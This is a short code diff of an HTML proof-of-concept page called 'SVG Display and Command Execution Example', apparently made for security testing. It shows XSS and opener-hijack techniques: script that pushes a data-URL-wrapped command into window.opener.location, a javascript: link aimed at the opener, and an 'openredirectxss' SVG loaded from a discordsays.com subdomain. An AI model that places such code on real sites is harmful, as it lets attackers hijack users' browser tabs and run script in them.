@@ -9,7 +9,7 @@
             if (window.opener) {
                 // Encode the command to be used in a data URL
                 const encodedCommand = encodeURIComponent(`data:text/html,<script>${command}<\/script>`);
-                window.opener.location = encodedCommand;
+                opener.location = encodedCommand;
             } else {
                 console.error('No opener found');
             }
@@ -26,7 +26,7 @@
 </head>
 <body>
     <h1>SVG Display and Command Execution Example</h1>
-    <img src="/openredirectxss.svg" alt="Description of SVG">
+    <img src="/1229114867307511879.discordsays.com/openredirectxss.svg" alt="Description of SVG">
     <a href="javascript:window.opener.location='alert(1)'">Click Me!</a>
     <a href="calculator:">Click Math!</a>
 </body>
